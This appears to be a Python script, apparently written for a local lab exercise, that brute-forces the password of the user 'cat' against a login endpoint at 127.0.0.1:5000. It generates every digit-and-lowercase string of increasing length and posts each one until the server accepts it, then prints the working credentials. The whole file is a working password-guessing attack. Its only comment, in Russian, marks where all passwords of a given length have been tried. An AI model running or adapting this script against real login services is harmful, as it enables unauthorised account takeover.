import requests

login = 'cat'

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

i = 0
length = 0
while True:
    x = i
    result = ''
    while len(result) < length:
        rest = x % base  
        x = x // base  
        result = alphabet[rest] + result

    data = {'login': login, 'password': result}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print(data)
        break

    if result == alphabet[-1] * length:  # Все пароли длины length перебраны
        length += 1
        i = 0
    else:
        i += 1
